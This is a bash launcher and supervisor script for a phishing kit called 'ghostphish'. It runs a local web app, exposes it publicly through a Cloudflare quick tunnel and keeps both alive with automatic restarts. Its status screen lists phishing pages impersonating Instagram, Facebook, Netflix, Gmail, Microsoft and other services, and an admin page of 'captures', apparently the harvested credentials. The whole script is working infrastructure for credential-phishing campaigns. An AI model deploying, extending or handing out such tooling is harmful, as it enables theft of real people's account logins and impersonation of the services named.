#!/usr/bin/env bash
#
# ghostphish unified launcher + maintenance supervisor
# ─────────────────────────────────────────────────────────────
# Launches the app AND tunnel together, ensures both stay alive,
# auto-restarts on failure, and provides unified health checks.
#
#   ./launch-and-maintain.sh           # interactive setup + launch
#   ./launch-and-maintain.sh status    # check health + show URLs
#   ./launch-and-maintain.sh health    # quick health probe
#   ./launch-and-maintain.sh logs      # tail combined logs
#   ./launch-and-maintain.sh stop      # stop everything gracefully
#

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT=8000
DATA_DIR="${SCRIPT_DIR}/data"

# Unified logs
APP_LOG="${SCRIPT_DIR}/ghostphish_app.log"
TUNNEL_LOG="${SCRIPT_DIR}/ghostphish_tunnel.log"
MAINT_LOG="${SCRIPT_DIR}/ghostphish_maintenance.log"
URL_FILE="${SCRIPT_DIR}/ghostphish_current.url"
PID_FILE="${SCRIPT_DIR}/ghostphish_maintenance.pid"
APP_PID_FILE="${SCRIPT_DIR}/ghostphish_app.pid"
TUNNEL_PID_FILE="${SCRIPT_DIR}/ghostphish_tunnel.pid"

# ─── colors ───────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'
B='\033[1;34m'; W='\033[1;37m'; N='\033[0m'; D='\033[2m'

ts() { date '+%Y-%m-%dT%H:%M:%S'; }
log_maint() { echo "[$(ts)] [MAINT] $*" >> "$MAINT_LOG"; }
log_app()   { echo "[$(ts)] [APP]   $*" >> "$APP_LOG"; }
log_tunnel() { echo "[$(ts)] [TUNNEL] $*" >> "$TUNNEL_LOG"; }

banner() {
    echo -e "${R}"
    echo -e "   █▀▀ █░█ █▀█ █▀ ▀█▀ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█"
    echo -e "   █▄█ █▀█ █▄█ ▄█ ░█░ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄"
    echo -e "${N}   ${Y}⚡ unified launcher + supervisor${N}"
    echo -e "   ${C}Developed by ${R}Yaman.RedTeam${N}\n"
}

# ─── Health checks ────────────────────────────────────────────
app_healthy() {
    curl -s -o /dev/null -w '%{http_code}' --max-time 3 \
        "http://localhost:${PORT}/health" 2>/dev/null | grep -q "200"
}

tunnel_pid_alive() {
    [[ -f "$TUNNEL_PID_FILE" ]] && kill -0 "$(cat "$TUNNEL_PID_FILE" 2>/dev/null)" 2>/dev/null
}

tunnel_connected() {
    local url; url="$(get_current_url)"
    if [[ -z "$url" ]]; then
        return 1
    fi

    curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$url" 2>/dev/null | grep -qE "^[23]"
}

app_pid_alive() {
    [[ -f "$APP_PID_FILE" ]] && kill -0 "$(cat "$APP_PID_FILE" 2>/dev/null)" 2>/dev/null
}

get_current_url() {
    cat "$URL_FILE" 2>/dev/null || echo ""
}

# ─── Start app (Docker or Python) ────────────────────────────
start_app() {
    log_maint "Ensuring app is running..."

    if app_healthy; then
        log_maint "App already healthy"
        return 0
    fi

    mkdir -p "$DATA_DIR"

    # Try Docker first
    if command -v docker >/dev/null 2>&1 && \
       (command -v docker-compose >/dev/null 2>&1 || docker compose version >/dev/null 2>&1) && \
       docker info >/dev/null 2>&1; then
        log_maint "Starting app via Docker..."
        (cd "$SCRIPT_DIR" && docker-compose up -d --build 2>&1) >> "$APP_LOG" 2>&1 || {
            log_maint "Docker start failed, trying Python fallback..."
        }
    else
        # Python fallback
        log_maint "Starting app via Python (uvicorn)..."
        cd "$SCRIPT_DIR" || return 1
        pkill -f "uvicorn app:app" 2>/dev/null || true
        sleep 1

        if ! python3 -c "import fastapi, uvicorn" 2>/dev/null; then
            log_maint "Installing Python dependencies..."
            pip install -r "$SCRIPT_DIR/requirements.txt" >> "$APP_LOG" 2>&1
        fi

        GHOSTPHISH_DATA="$DATA_DIR" \
            setsid python3 -m uvicorn app:app --host 0.0.0.0 --port "$PORT" \
            </dev/null >> "$APP_LOG" 2>&1 &
        echo $! > "$APP_PID_FILE"
        disown 2>/dev/null || true
    fi

    # Wait for app to come up (up to 30s)
    for i in {1..30}; do
        if app_healthy; then
            log_maint "✓ App healthy after ${i}s"
            return 0
        fi
        sleep 1
    done

    log_maint "✗ App failed to become healthy after 30s"
    tail -10 "$APP_LOG" | sed 's/^/  [APP] /' >> "$MAINT_LOG"
    return 1
}

# ─── Start tunnel ────────────────────────────────────────────
start_tunnel() {
    log_maint "Starting tunnel..."

    if ! command -v cloudflared >/dev/null 2>&1; then
        log_maint "cloudflared not installed · tunnel unavailable"
        return 1
    fi

    if tunnel_pid_alive; then
        log_maint "Tunnel already running"
        return 0
    fi

    rm -f "$URL_FILE"
    local run_log="${SCRIPT_DIR}/.cf_run.log"
    : > "$run_log"

    cloudflared tunnel --url "http://localhost:${PORT}" >> "$run_log" 2>&1 &
    local cf_pid=$!
    echo $cf_pid > "$TUNNEL_PID_FILE"
    log_maint "Cloudflared started (pid=${cf_pid})"

    # Wait for URL to appear (up to 30s)
    for i in {1..30}; do
        url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$run_log" | head -1)
        if [[ -n "$url" ]]; then
            echo "$url" > "$URL_FILE"
            log_maint "✓ Tunnel live: $url"
            cat "$run_log" >> "$TUNNEL_LOG"
            return 0
        fi

        if ! kill -0 "$cf_pid" 2>/dev/null; then
            log_maint "✗ Cloudflared crashed before URL appeared"
            cat "$run_log" >> "$TUNNEL_LOG"
            rm -f "$TUNNEL_PID_FILE"
            return 1
        fi

        sleep 1
    done

    log_maint "✗ Tunnel timeout (no URL after 30s)"
    cat "$run_log" >> "$TUNNEL_LOG"
    rm -f "$TUNNEL_PID_FILE" "$URL_FILE"
    return 1
}

# ─── Maintenance loop ────────────────────────────────────────
maintain() {
    echo "$$" > "$PID_FILE"
    log_maint "Maintenance supervisor started (pid $$)"

    trap 'log_maint "Caught TERM, shutting down gracefully";
          kill_graceful; exit 0' TERM INT

    local tunnel_fail_count=0
    local last_url_check=0
    local tunnel_start_time=0

    while true; do
        # Ensure app is healthy
        if ! app_healthy; then
            log_maint "App unhealthy, restarting..."
            start_app || sleep 5
            tunnel_fail_count=0
            tunnel_start_time=0
            continue
        fi

        # Check tunnel connection (not just if process is alive)
        local now; now=$(date +%s)
        if (( now - last_url_check >= 10 )); then
            last_url_check=$now

            if ! tunnel_pid_alive; then
                log_maint "Tunnel process dead, attempting restart..."
                if start_tunnel; then
                    tunnel_fail_count=0
                    tunnel_start_time=$now
                else
                    (( tunnel_fail_count++ ))
                    log_maint "Tunnel restart failed (attempt $tunnel_fail_count)"
                fi
            elif (( now - tunnel_start_time > 30 )); then
                if ! tunnel_connected; then
                    log_maint "Tunnel connection lost (no response), restarting..."
                    if [[ -f "$TUNNEL_PID_FILE" ]]; then
                        kill "$(cat "$TUNNEL_PID_FILE")" 2>/dev/null || true
                        sleep 1
                    fi
                    rm -f "$TUNNEL_PID_FILE" "$URL_FILE"
                    if start_tunnel; then
                        tunnel_fail_count=0
                        tunnel_start_time=$now
                    else
                        (( tunnel_fail_count++ ))
                        log_maint "Tunnel restart failed (attempt $tunnel_fail_count)"
                    fi
                else
                    tunnel_fail_count=0
                fi
            fi
        fi

        # Check every 5 seconds (balance between responsiveness and stability)
        sleep 5
    done
}

kill_graceful() {
    log_maint "Graceful shutdown..."

    # Kill tunnel first
    if [[ -f "$TUNNEL_PID_FILE" ]]; then
        local pid; pid="$(cat "$TUNNEL_PID_FILE")"
        kill "$pid" 2>/dev/null || true
    fi

    # Stop container or process
    if command -v docker >/dev/null 2>&1; then
        docker-compose -C "$SCRIPT_DIR" down 2>/dev/null || true
    else
        pkill -f "uvicorn app:app" 2>/dev/null || true
    fi

    rm -f "$PID_FILE" "$TUNNEL_PID_FILE" "$APP_PID_FILE" "$URL_FILE"
    log_maint "Shutdown complete"
}

# ─── Commands ─────────────────────────────────────────────────
cmd_start() {
    banner

    # Start maintenance loop in background
    if [[ -f "$PID_FILE" ]] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
        echo -e "${Y}[!] Already running (pid $(cat "$PID_FILE"))${N}"
        cmd_status
        return
    fi

    : > "$APP_LOG"
    : > "$TUNNEL_LOG"
    : > "$MAINT_LOG"

    setsid bash "${BASH_SOURCE[0]}" __maintain >/dev/null 2>&1 < /dev/null &
    disown 2>/dev/null || true

    echo -e "${G}[✓] Supervisor starting…${N}"
    echo -e "    Waiting for app and tunnel to come online..."

    for i in {1..40}; do
        if app_healthy; then
            url=$(get_current_url)
            if [[ -n "$url" ]]; then
                sleep 1
                cmd_status
                return
            fi
        fi
        sleep 1
    done

    echo -e "${Y}[~] Started but waiting on tunnel. Check: ./launch-and-maintain.sh status${N}"
}

cmd_status() {
    banner

    if ! [[ -f "$PID_FILE" ]] || ! kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
        echo -e "${R}○ Not running   —   ./launch-and-maintain.sh start${N}"
        return
    fi

    local app_stat="${G}✓${N}"
    app_healthy || app_stat="${R}✗${N}"

    local tunnel_stat="${G}✓${N}"
    tunnel_pid_alive || tunnel_stat="${R}✗${N}"

    local url; url="$(get_current_url)"

    echo -e "${W}════════════════════════════════════════════════════════${N}"
    echo -e "   App              ${app_stat}   (localhost:${PORT})"
    echo -e "   Tunnel           ${tunnel_stat}"
    echo -e "${W}════════════════════════════════════════════════════════${N}"

    if [[ -n "$url" ]]; then
        echo -e "${C}   Public URL:${N} ${B}${url}${N}\n"
        echo -e "${Y}   ── Phishing pages ──────────────────────────────${N}"
        for t in instagram facebook netflix twitter linkedin snapchat microsoft gmail; do
            printf "   %-14s ${W}%s${N}\n" "$t" "${url}/${t}"
        done
        echo
        echo -e "${Y}   ── Admin ───────────────────────────────────────${N}"
        printf "   %-14s ${W}%s${N}\n" "captures" "${url}/admin/captures"
    else
        echo -e "${Y}[~] No tunnel URL yet (tunnel starting or unavailable)${N}"
        echo -e "    App is up, but public URL not available."
        echo -e "    Check: ./launch-and-maintain.sh logs"
    fi

    echo
    echo -e "${W}════════════════════════════════════════════════════════${N}"
    echo -e "${D}Check logs:${N} tail -f ${MAINT_LOG}"
}

cmd_health() {
    local app_code; app_code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 \
        "http://localhost:${PORT}/health" 2>/dev/null || echo "000")

    local url; url="$(get_current_url)"

    echo "app_http_code=$app_code tunnel_url=${url:-none}"
}

cmd_stop() {
    if ! [[ -f "$PID_FILE" ]] || ! kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
        echo -e "${Y}[!] Not running${N}"
        return
    fi

    local pid; pid="$(cat "$PID_FILE")"
    echo -e "${R}[!] Stopping (pid ${pid})…${N}"
    kill -TERM "$pid" 2>/dev/null

    for _ in $(seq 1 10); do
        if ! kill -0 "$pid" 2>/dev/null; then
            echo -e "${G}[✓] Stopped${N}"
            return
        fi
        sleep 1
    done

    kill -KILL "$pid" 2>/dev/null
    echo -e "${G}[✓] Stopped (force)${N}"
}

cmd_logs() {
    banner
    echo -e "${C}Tailing logs (Ctrl+C to stop)${N}\n"
    tail -f "$MAINT_LOG"
}

# ─── Main dispatch ────────────────────────────────────────────
case "${1:-start}" in
    __maintain) maintain ;;
    start)      cmd_start ;;
    stop)       cmd_stop ;;
    status)     cmd_status ;;
    health)     cmd_health ;;
    logs)       cmd_logs ;;
    *)
        echo "Usage: $0 {start|stop|status|health|logs}"
        exit 1
        ;;
esac
